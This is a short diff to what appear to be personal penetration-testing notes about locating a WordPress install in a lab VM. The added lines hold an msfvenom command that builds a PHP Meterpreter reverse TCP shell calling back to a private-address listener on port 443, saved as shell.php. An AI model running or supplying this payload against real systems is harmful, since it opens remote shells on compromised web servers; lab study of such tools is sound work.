@@ -104,6 +104,10 @@ inshallah  hopefully everything will works fine !!!!
 locate wordprss(in Vple)
 
 
+///metasploit commands
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.174.128 lport=443 -f raw > shell.php
+
+
 
 
 
